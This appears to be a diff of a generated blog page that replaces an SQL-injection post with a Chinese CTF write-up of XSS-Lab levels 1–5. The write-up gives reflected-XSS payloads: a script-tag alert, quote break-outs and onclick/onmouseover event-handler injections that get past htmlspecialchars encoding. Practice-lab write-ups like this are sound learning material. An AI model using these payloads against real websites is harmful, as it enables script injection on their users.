@@ -24,26 +24,27 @@
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.22.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
 
-    <meta name="description" content="JNU_WEB">
+    <meta name="description" content="1  XSS-Lab">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入学习总结">
-<meta property="og:url" content="http://example.com/2025/03/02/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:title" content="xss刷题记录">
+<meta property="og:url" content="http://example.com/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="CTF学习笔记">
-<meta property="og:description" content="JNU_WEB">
+<meta property="og:description" content="1  XSS-Lab">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-02T07:33:24.000Z">
-<meta property="article:modified_time" content="2025-03-02T07:33:24.495Z">
+<meta property="article:published_time" content="2025-03-10T13:23:17.000Z">
+<meta property="article:modified_time" content="2025-03-10T14:31:32.994Z">
 <meta property="article:author" content="温柔刀">
+<meta property="article:tag" content="xss">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/2025/03/02/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+<link rel="canonical" href="http://example.com/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/03/02/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/","path":"2025/03/02/SQL注入学习总结/","title":"SQL注入学习总结"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/","path":"2025/03/10/xss刷题记录/","title":"xss刷题记录"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>SQL注入学习总结 | CTF学习笔记</title>
+<title>xss刷题记录 | CTF学习笔记</title>
   
 
 
@@ -104,7 +105,7 @@
 
 
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -117,6 +118,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-Lab"><span class="nav-number">1.</span> <span class="nav-text">XSS-Lab</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1"><span class="nav-number">1.1.</span> <span class="nav-text">1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2"><span class="nav-number">1.2.</span> <span class="nav-text">2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3"><span class="nav-number">1.3.</span> <span class="nav-text">3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4"><span class="nav-number">1.4.</span> <span class="nav-text">4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5"><span class="nav-number">1.5.</span> <span class="nav-text">5</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -175,7 +177,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/02/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar_2.gif">
@@ -188,12 +190,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="SQL注入学习总结 | CTF学习笔记">
+      <meta itemprop="name" content="xss刷题记录 | CTF学习笔记">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          SQL注入学习总结
+          xss刷题记录
         </h1>
 
         <div class="post-meta-container">
@@ -203,8 +205,18 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2025-03-02 15:33:24" itemprop="dateCreated datePublished" datetime="2025-03-02T15:33:24+08:00">2025-03-02</time>
+      <time title="创建时间：2025-03-10 21:23:17 / 修改时间：22:31:32" itemprop="dateCreated datePublished" datetime="2025-03-10T21:23:17+08:00">2025-03-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
+        </span>
     </span>
 
   
@@ -216,8 +228,8 @@
     </span>
     <span class="post-meta-item-text">Waline：</span>
   
-    <a title="waline" href="/2025/03/02/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/2025/03/02/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="commentCount"></span>
+    <a title="waline" href="/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/#waline" itemprop="discussionUrl">
+      <span class="post-comments-count waline-comment-count" data-path="/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -228,7 +240,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>0</span>
+      <span>312</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -245,7 +257,49 @@
     
     
     
-    <div class="post-body" itemprop="articleBody">
+    <div class="post-body" itemprop="articleBody"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="XSS-Lab"><a href="#XSS-Lab" class="headerlink" title="XSS-Lab"></a>XSS-Lab</h1><span id="more"></span>
+
+<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><script>alert('xss')</script>
+
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>查看源代码</p>
+<input name=keyword  value="【payload】">
+
+<p>双引号闭合</p>
+<p><input name=keyword  value="">【payload】”&gt;</p>
+<p>把【payload】换成<script>alert(&#39;xss&#39;)</script>   (后面那个引号是否注释不影响)</p>
+<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><input name=keyword  value='payload'>
+
+<p>其中：</p>
+<ul>
+<li><code>&lt;</code> 代表 <code>&lt;</code></li>
+<li><code>&gt;</code> 代表 <code>&gt;</code></li>
+<li><code>&quot;</code> 代表 <code>&quot;</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input name=keyword  value=&#x27;&amp;lt;input name=keyword  value=&amp;quot;&amp;lt;script&amp;gt;alert(&#x27;xss&#x27;)&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现把&lt;&gt;””之类的转义了，所以不用长这样的payloadl了.</p>
+<p>这里采用了实体编码<code>htmlspecialchars</code>,<code>htmlspecialchars()</code> 函数可以把一些预定义的字符转换为 HTML 实体。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; （和号）成为 &amp;amp;</span><br><span class="line">&quot; （双引号）成为 &amp;quot;</span><br><span class="line">&#x27; （单引号）成为 &amp;#039</span><br><span class="line">&lt; （小于）成为 &amp;lt;</span><br><span class="line">&gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure>
+
+<p>可用的引号类型：</p>
+<p><code>ENT_COMPAT</code> 默认 仅编码双引号</p>
+<p><code>ENT_QUOTES</code> 编码双引号和单引号</p>
+<p><code>ENT_NOQUOTES</code> 不编码任何引号</p>
+<p>所以此处我们不能选择有<code>&lt;</code>和<code>&gt;</code>的方式，但是可以使用不带有尖括号的特殊字符进行尝试：</p>
+<p>‘ onclick &#x3D;’javascript:alert(1)’&#x2F;&#x2F; (这两个&#x2F;&#x2F;不加也行)</p>
+<p>‘onmouseover &#x3D; ‘javascript:alert(1)</p>
+<p>一直尝试，我说怎么不管用，关上hackbar弹窗怦怦跳。这里即使显示payload长度也能过</p>
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><input name=keyword  value="payload">
+
+<p>&lt;input name&#x3D;keyword  value&#x3D;””scriptalert(‘xss’)&#x2F;script”&gt;</p>
+<p>直接把&lt;&gt;替换掉了</p>
+<p>“onclick &#x3D;’javascript:alert(1)’&#x2F;&#x2F;秒了</p>
+<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><input name=keyword  value="payload">
+
+<p>&lt;input name&#x3D;keyword  value&#x3D;””o_nclick &#x3D;’javascript:alert(1)’&#x2F;&#x2F;“&gt;</p>
+
     </div>
 
     
@@ -253,6 +307,9 @@
     
 
     <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i> xss</a>
+          </div>
 
         
   <div class="social-like a2a_kit a2a_kit_size_32 a2a_default_style">
@@ -263,14 +320,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2025/03/02/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-%E7%AE%80%E7%AE%80%E5%8D%95%E5%8D%95%E7%9A%84%E9%80%BB%E8%BE%91/" rel="prev" title="[SWPUCTF 2021 新生赛]简简单单的逻辑">
-                  <i class="fa fa-angle-left"></i> [SWPUCTF 2021 新生赛]简简单单的逻辑
+                <a href="/2025/03/09/NSSRound-V-Team-PYRCE/" rel="prev" title="[NSSRound#V Team]PYRCE">
+                  <i class="fa fa-angle-left"></i> [NSSRound#V Team]PYRCE
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2025/03/02/%E8%AE%A9AI%E5%86%99%E4%BD%9C%E4%B8%9A%E7%9A%84%E5%B0%9D%E8%AF%95/" rel="next" title="让AI写作业的尝试">
-                  让AI写作业的尝试 <i class="fa fa-angle-right"></i>
-                </a>
             </div>
           </div>
     </footer>
@@ -352,7 +406,7 @@
 
 
 
-<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"comment-three-tau.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"说两句吧~","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2025/03/02/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"}</script>
+<script class="next-config" data-name="waline" type="application/json">{"lang":"zh-cn","enable":true,"serverURL":"comment-three-tau.vercel.app","cssUrl":"https://unpkg.com/@waline/client@v2/dist/waline.css","commentCount":true,"pageview":false,"placeholder":"说两句吧~","avatar":"mm","meta":["nick","mail","link"],"pageSize":10,"visitor":true,"comment_count":true,"requiredFields":["nick","mail"],"libUrl":"//unpkg.com/@waline/client@v2/dist/waline.js","el":"#waline","comment":true,"path":"/2025/03/10/xss%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"}</script>
 <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css">
 <script>
 document.addEventListener('page:loaded', () => {
